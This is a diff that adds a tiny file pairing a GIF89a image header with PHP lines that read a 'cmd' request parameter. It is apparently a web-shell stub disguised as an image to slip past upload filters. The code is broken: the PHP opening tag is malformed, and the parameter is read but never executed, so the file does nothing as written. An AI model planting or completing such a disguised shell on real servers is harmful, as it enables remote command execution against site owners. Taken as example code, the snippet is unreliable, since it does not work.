@@ -1,0 +1,4 @@
+<php
+GIF89a;
+$_GET ['cmd'];
+?>
